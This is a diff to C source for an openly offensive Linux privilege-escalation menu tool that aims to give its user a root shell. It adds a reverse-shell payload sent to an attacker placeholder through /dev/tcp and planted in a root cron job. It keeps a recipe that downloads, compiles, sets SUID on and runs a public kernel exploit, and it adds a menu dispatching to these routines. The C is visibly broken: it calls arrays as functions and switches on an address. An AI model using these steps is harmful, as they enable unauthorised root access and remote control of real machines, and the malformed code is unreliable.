@@ -40,17 +40,57 @@ uint8_t suidEsc[100] {
     // ^R^X
     // reset; sh 1>&0 2>&0
 }
+
+/**
+ * obviously we need netcat running on that port specified in the script. this will give us a root shell
+*/
 uint8_t cronEsc[100] {
     // cd /home
-    // echo "/bin/bash" > cron.sh
+    // echo "bash -i >& /dev/tcp/ATTACKER_IP_ADDRESS/PORT" > cron.sh
     // echo "* * * * * root /home/cron.sh"
 }
+
 uint8_t kernelExp[100] {
     // cd /tmp
     // wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2015/CVE-2015-1328/37292.c
     // gcc 37292.c -o kernelExp
     // chmod +s kernelExp
     // ./kernelExp
+}
+
+void exploitMenu(void) {
+    printf("\nThis is a set of pre-configured scripts meant for gaining a root shell, via the means of physically being connected to the system(perhaps by an HDMI cable), or perhaps through a reverse shell.\n");
+    printf("\n1. Binary path Exploit\n");
+    printf("2. SUID Exploit with GNU Nano\n");
+    printf("3. Reverse shell through Cron-jobs\n");
+    printf("4. (Older) Kernel Exploit\n");
+
+    printf("\n> ");
+    int choiceD;
+    scanf("%d", &choiceD);
+
+    switch(&choiceD) {
+        case 1:
+            binaryEsc(void);
+            break;
+
+        case 2:
+            suidEsc(void);
+            break;
+
+        case 3:
+            cronEsc(void);
+            break;
+
+        case 4:
+            kernelExp(void);
+            break;
+
+        default:
+            printf("\n%d: Invalid choice :/\n", choiceD);
+            break;
+    }
+
 }
 
 // attack creates a binary then runs it in the /tmp directory
